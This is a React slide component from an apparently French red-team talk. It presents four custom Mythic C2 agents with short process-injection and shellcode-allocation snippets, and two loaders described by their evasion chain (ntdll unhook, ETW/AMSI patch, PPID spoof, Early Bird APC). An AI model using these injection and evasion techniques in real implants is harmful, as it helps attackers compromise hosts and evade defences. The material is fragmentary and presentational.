import { SlideContext, SlideMeta } from '../engine/types'
import { motion } from 'framer-motion'
import { tokens } from '../design/tokens'
import { Eyebrow } from '../ui/Eyebrow'
import { AgentCard, Tag } from './_shared'

export const meta: SlideMeta = {
  title: 'Les 4 agents',
  speaker: ['Jeremy'],
  notes: 'Présentez les 4 agents from scratch. Insistez : chaque langage, chaque OS, chaque snippet est réel. Puis Hephaestus le loader.',
}

const AGENTS = [
  {
    lang: 'C',
    name: 'Kratos',
    os: 'Windows',
    color: tokens.color.accent.blue,
    desc: 'Agent C minimaliste. Footprint réduit, DLL injection, aucune dépendance.',
    code: `LPVOID buf = VirtualAllocEx(hProc, 0,
  sz, MEM_COMMIT|MEM_RESERVE,
  PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, buf, sc, sz, 0);`,
  },
  {
    lang: 'Go',
    name: 'Morpheus',
    os: 'Windows',
    color: tokens.color.accent.teal,
    desc: 'Obfusqué via garble - aucun import visible dans le binaire compilé.',
    code: `hProc, _ := windows.OpenProcess(
  windows.PROCESS_ALL_ACCESS,
  false, uint32(pid))
defer windows.CloseHandle(hProc)`,
  },
  {
    lang: 'Py',
    name: 'Hermes',
    os: 'Linux',
    color: tokens.color.semantic.warning,
    desc: 'Flexibilité post-exploitation, scripting inline, compatible Python 3.',
    code: `buf = ctypes.windll.kernel32\\
  .VirtualAlloc(0,len(sc),0x3000,0x40)
ctypes.windll.kernel32\\
  .RtlMoveMemory(buf, sc, len(sc))`,
  },
  {
    lang: 'Nim',
    name: 'Aphrodite',
    os: 'Cross-platform',
    color: tokens.color.accent.violet,
    desc: 'AES-256-CBC + HMAC-SHA256, hidstr XOR compile-time, SOCKS5 proxy integre.',
    code: `let key = hidstr("SL_PSK_AES256")
let enc = aesCBC.encrypt(payload, key)
discard checkin(b64encode(enc),
  config.uuid, config.c2)`,
  },
]

export function Component(_: SlideContext) {
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 24, width: '100%', alignItems: 'flex-start' }}>

      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.4 }}>
        <Eyebrow>06 - Agents Mythic</Eyebrow>
      </motion.div>

      <motion.h2
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.1 }}
        style={{ fontSize: tokens.type.size['2xl'], fontWeight: tokens.type.weight.semibold, letterSpacing: tokens.type.tracking.tight, color: tokens.color.text.primary, margin: 0 }}
      >
        4 agents développés from scratch
      </motion.h2>

      <motion.div
        initial="hidden"
        animate="show"
        variants={{ hidden: {}, show: { transition: { staggerChildren: 0.1, delayChildren: 0.15 } } }}
        style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 12, width: '100%' }}
      >
        {AGENTS.map(({ lang, name, os, color, desc, code }) => (
          <motion.div key={name} variants={{ hidden: { opacity: 0, y: 20 }, show: { opacity: 1, y: 0, transition: { duration: 0.5 } } }}>
            <AgentCard lang={lang} name={name} os={os} color={color} desc={desc} code={code} />
          </motion.div>
        ))}
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 14 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.58 }}
        style={{ width: '100%', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}
      >
        {/* Hephaestus */}
        <div style={{ background: tokens.color.surface.subtle, border: `1px solid ${tokens.color.surface.line}`, borderLeft: `2px solid ${tokens.color.semantic.warning}`, borderRadius: 8, padding: '14px 18px', display: 'flex', flexDirection: 'column', gap: 10 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <div style={{ fontFamily: tokens.type.family.mono, fontSize: tokens.type.size.md, fontWeight: 700, color: tokens.color.semantic.warning }}>Hephaestus</div>
            <Tag color={tokens.color.semantic.warning}>Loader Nim · Windows</Tag>
          </div>
          <p style={{ fontSize: tokens.type.size.sm, color: tokens.color.text.secondary, lineHeight: tokens.type.leading.relaxed, margin: 0 }}>
            Wrapper Aphrodite via <strong style={{ color: tokens.color.text.primary, fontFamily: tokens.type.family.mono }}>donut</strong> (EXE → shellcode). Applique ntdll unhook, ETW/AMSI patch, PPID spoof puis injecte via Early Bird APC ou Thread Hijacking.
          </p>
          <pre style={{ fontFamily: tokens.type.family.mono, fontSize: tokens.type.size.xs, color: tokens.color.text.tertiary, background: tokens.color.surface.tech, border: `1px solid ${tokens.color.surface.line}`, borderRadius: 5, padding: '7px 10px', margin: 0, lineHeight: 1.5 }}>
{`ntdll unhook → ETW patch → AMSI patch
PPID spoof → VirtualAllocEx
→ Early Bird APC | Thread Hijack`}
          </pre>
        </div>

        {/* Atreus */}
        <div style={{ background: tokens.color.surface.subtle, border: `1px solid ${tokens.color.surface.line}`, borderLeft: `2px solid ${tokens.color.accent.blue}`, borderRadius: 8, padding: '14px 18px', display: 'flex', flexDirection: 'column', gap: 10 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <div style={{ fontFamily: tokens.type.family.mono, fontSize: tokens.type.size.md, fontWeight: 700, color: tokens.color.accent.blue }}>Atreus</div>
            <Tag color={tokens.color.accent.blue}>Loader C · Windows</Tag>
          </div>
          <p style={{ fontSize: tokens.type.size.sm, color: tokens.color.text.secondary, lineHeight: tokens.type.leading.relaxed, margin: 0 }}>
            Loader C minimaliste. Chargement de shellcode avec contournement des defenses AV/EDR, concu pour etre leger et facilement adaptable.
          </p>
          <pre style={{ fontFamily: tokens.type.family.mono, fontSize: tokens.type.size.xs, color: tokens.color.text.tertiary, background: tokens.color.surface.tech, border: `1px solid ${tokens.color.surface.line}`, borderRadius: 5, padding: '7px 10px', margin: 0, lineHeight: 1.5 }}>
{`// loader C minimaliste
shellcode → decrypt → map → exec
→ minimal footprint, no CRT dep`}
          </pre>
        </div>
      </motion.div>

    </div>
  )
}
